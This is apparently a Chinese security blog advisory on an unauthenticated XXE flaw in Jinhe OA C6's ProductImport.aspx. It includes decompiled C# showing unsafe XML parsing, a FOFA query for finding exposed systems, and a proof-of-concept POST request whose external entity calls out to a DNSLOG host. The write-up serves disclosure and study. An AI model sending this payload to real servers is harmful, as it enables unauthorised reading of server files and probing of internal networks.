---
title: "金和OA ProductImport.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ContractManagement-ProductImport-xxe.html
asset_dir: assets/金和oa-productimport.aspx-xxe漏洞
---

# 金和OA ProductImport.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/6 13:35
- 261浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

漏洞扫描器

安全运维咨询

SQL注入检测工具

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ProductImport.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ProductImport.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ContractManagement.dll` 将其进行反编译后找到 **ProductImport** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  ((Control) this).Page.Response.Write(this.ImportData());
  ((Control) this).Page.Response.End();
}
```

深入探索

漏洞预警服务

Web安全课程

编码转换工具

跟进 `ImportData` 方法

```
protected string ImportData()
{
  string str1 = string.Empty;
  DateTime now = DateTime.Now;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
```

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.ContractManagement/Importing/ProductImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

深入探索

防火墙软件

数据库

安全认证考试

[![金和OA ProductImport.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
